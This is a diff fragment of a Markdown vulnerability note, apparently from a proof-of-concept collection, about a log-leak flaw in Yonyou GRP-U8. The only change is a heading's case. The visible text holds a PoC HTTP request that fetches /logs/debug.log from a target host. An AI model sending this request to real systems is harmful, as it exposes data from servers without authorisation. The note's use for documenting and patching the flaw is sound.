@@ -1,7 +1,7 @@
 ## 用友GRP-U8日志泄漏漏洞
 
 
-## poc
+## POC
 ```
 GET /logs/debug.log HTTP/1.1
 Host: 172.16.135.132:8009
